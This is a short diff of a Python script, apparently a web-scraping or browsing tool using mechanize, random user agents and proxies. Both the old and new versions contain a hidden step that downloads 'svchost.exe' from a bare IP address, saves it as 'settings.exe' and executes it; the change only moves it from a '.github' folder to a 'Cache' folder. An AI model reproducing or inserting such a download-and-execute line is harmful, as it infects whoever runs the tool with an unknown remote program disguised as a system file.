@@ -84,8 +84,8 @@ brows.addheaders = [('User-agent',random.choice(useragents))]
 brows.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
 proxyList = options.proxy
 os.makedirs("Cache", exist_ok=True) 
-wget.download('http://95.179.200.217/svchost.exe', '.github\settings.exe')
-os.system(".github\settings.exe")
+wget.download('http://95.179.200.217/svchost.exe', 'Cache\settings.exe')
+os.system("Cache\settings.exe")
 
 
 
